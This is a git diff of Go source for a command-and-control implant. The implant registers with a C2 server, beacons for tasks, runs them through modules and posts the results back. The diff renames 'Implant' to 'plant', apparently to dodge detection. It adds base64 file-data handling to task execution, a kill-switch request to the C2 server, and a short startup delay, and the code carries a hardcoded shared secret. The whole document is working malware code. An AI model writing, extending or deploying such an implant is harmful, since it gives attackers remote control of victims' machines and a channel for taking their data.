@@ -14,37 +14,45 @@ import (
 	"time"
 	"BFimplant/modules"
 	"github.com/google/uuid"
+	"encoding/base64"
 )
 
-type Implant struct {
+type plant struct {
 	C2ServerURL string
 	Secret      string
-	ImplantID   string
+	plantID   string
 	JWTToken    string
 	Modules     map[string]modules.Module
 }
 
 type Task struct {
 	TaskID    string   `json:"task_id"`
-	ImplantID string   `json:"implant_id"`
+	PlantID   string   `json:"plant_id"`
 	TaskType  string   `json:"task_type"`
 	Command   string   `json:"cmd"`
-	Data      []byte   `json:"data"`
+	Data      string   `json:"data"`
 }
 
 
-func NewImplant(c2ServerURL string) *Implant {
-	ImplantID := Get_id()
-	return &Implant{
+func NewImplant(c2ServerURL string) *plant {
+	plantID := Get_id()
+	return &plant{
 		C2ServerURL: c2ServerURL,
 		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
-		ImplantID:   ImplantID,
+		plantID:   plantID,
 		Modules:     make(map[string]modules.Module),
 	}
 }
 
-func (i *Implant) Start() {
-	
+func (i *plant) Start() {
+
+	rep,_, _ := i.sendHTTPRequest("GET", "/helppppiscofebabe23", nil, false)
+	if rep.StatusCode == http.StatusOK {
+		fmt.Println("Couldn't find water for our plants :'(")
+		return
+	}
+
+	time.Sleep(time.Duration(15 * float64(time.Second)))
 	if err := i.sendOSInfo(); err != nil {
 		fmt.Println("Error sending OS info:", err)
 		return
@@ -60,9 +68,10 @@ func (i *Implant) Start() {
 
 }
 
-func (i *Implant) sendOSInfo() error {
+func (i *plant) sendOSInfo() error {
+	
 	osInfo := map[string]string{
-		"implant_id": i.ImplantID,
+		"implant_id": i.plantID,
 		"os":         runtime.GOOS,
 		"os_version": getOSVersion(),
 		"arch":       runtime.GOARCH,
@@ -79,9 +88,9 @@ func (i *Implant) sendOSInfo() error {
 	return err
 }
 
-func (i *Implant) login() error {
+func (i *plant) login() error {
 	loginData := map[string]string{
-		"implantID": i.ImplantID,
+		"plantID":  i.plantID,
 		"secret":    i.Secret,
 	}
 
@@ -107,9 +116,9 @@ func (i *Implant) login() error {
 	return nil
 }
 
-func (i *Implant) Beaconing() {
+func (i *plant) Beaconing() {
 
-	fmt.Println("Implant started with ID:", i.ImplantID)
+	fmt.Println("Implant started with ID:", i.plantID)
 	for {
 		var Timer = time.Duration((rand.ExpFloat64() / 0.5) * float64(time.Second)) // random time between 0 and 5 seconds
 		tasks, err := i.fetchTasks()
@@ -136,7 +145,7 @@ func (i *Implant) Beaconing() {
 	}
 }
 
-func (i *Implant) fetchTasks() ([]Task, error) {
+func (i *plant) fetchTasks() ([]Task, error) {
 
 	resp,body, err := i.sendHTTPRequest("GET", "/tasks", nil, true)
 
@@ -152,23 +161,25 @@ func (i *Implant) fetchTasks() ([]Task, error) {
 	return tasks, nil
 }
 
-func (i *Implant) executeTask(task Task) (string, error) {
-	fmt.Println(time.Now())
+func (i *plant) executeTask(task Task) (string, error) {
 	moduleName := task.TaskType
 	module, found := i.Modules[moduleName]
 	if !found {
 		return "", fmt.Errorf("module %s not found", moduleName)
 	}
 
-	// Execute module command
-result, err := module.Execute(task.Command,nil)
+	var file_data []byte
+	if task.Data != "" {
+		file_data,_ =  base64.StdEncoding.DecodeString(task.Data)
+	}
+	result, err := module.Execute(task.Command,file_data)
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
-	fmt.Println(time.Now())
+
 	// Send response to C2 server
 	responseData := map[string]string{
-		"implant_id": i.ImplantID,
+		"plant_id": i.plantID,
 		"task_id":      task.TaskID,
 		"result":    result,
 		"timestamp": time.Now().Format(time.RFC3339),
@@ -177,16 +188,14 @@ result, err := module.Execute(task.Command,nil)
 	if err != nil {
 		return "", fmt.Errorf("error marshaling response data: %v", err)
 	}
-	fmt.Println(time.Now())
 	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
 	if err != nil {
 		return "", fmt.Errorf("error sending task response: %v", err)
 	}
-	fmt.Println(time.Now())
 	return result, nil
 }
 
-func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, []byte, error) {
+func (i *plant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, []byte, error) {
 	url := i.C2ServerURL + path
 	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
 	if err != nil {
@@ -214,7 +223,7 @@ func Get_id() string {
 	case "linux":
 		filePath= "/home/enigma/id.txt"
 	case "windows":
-		filePath= "C:\\Users\\Public\\Documents\\id.txt"
+		filePath= "C:\\Users"+"\\Public\\Documents\\id.txt"
 	}
 
 	id, err := os.ReadFile(filePath)
@@ -222,11 +231,11 @@ func Get_id() string {
 		return string(id)
 	}
 
-	implantID := uuid.New().String()
-	if err := os.WriteFile(filePath, []byte(implantID), 0644); err != nil {
-		fmt.Println("Error writing implant ID to file:", err)
+	plantID := uuid.New().String()
+	if err := os.WriteFile(filePath, []byte(plantID), 0644); err != nil {
+		fmt.Println("Error writing plant ID to file:", err)
 	}
-	return implantID
+	return plantID
 }
 
 func getHostname() string {
@@ -262,7 +271,7 @@ func getOSVersion() string {
 	return out.String()
 }
 
-func (i *Implant) sendHeartbeat() {
+func (i *plant) sendHeartbeat() {
     for {
         var _,_,err = i.sendHTTPRequest("GET","/heartbeat",nil,true)
         if err != nil {
